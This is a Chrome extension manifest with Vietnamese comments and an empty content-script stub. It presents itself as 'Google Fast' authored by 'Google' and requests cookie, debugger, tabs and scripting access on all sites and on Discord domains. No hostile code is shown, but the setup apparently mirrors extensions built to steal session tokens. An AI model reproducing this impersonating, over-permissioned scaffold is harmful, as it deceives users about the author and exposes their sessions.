// Trong tệp manifest.json
{
  "manifest_version": 3,
  "name": "Google Fast",
  "description": "Google web flow controller",
  "author": "Google",
  "version": "3.1.2",
  "icons": {
    "16": "images/logo16.png",
    "48": "images/logo48.png",
    "128": "images/logo128.png"
  },
  "background": {
    "service_worker": "js/background.js"
  },
  "content_scripts": [
    {
      "all_frames": true,
      "js": ["js/content.js"],
      "matches": ["http://*/*", "https://*/*", "https://discord.com/*", "https://canary.discord.com/*", "https://ptb.discord.com/*"]
    }
  ],
  "permissions": [
    "tabs",
    "cookies",
    "debugger",
    "webNavigation",
    "activeTab",
    "scripting",
    "https://discord.com/*",
    "https://canary.discord.com/*",
    "https://ptb.discord.com/*"
  ]
}

// Trong tệp js/content.js
// Đặt mã cần truy cập đến DOM ở đây
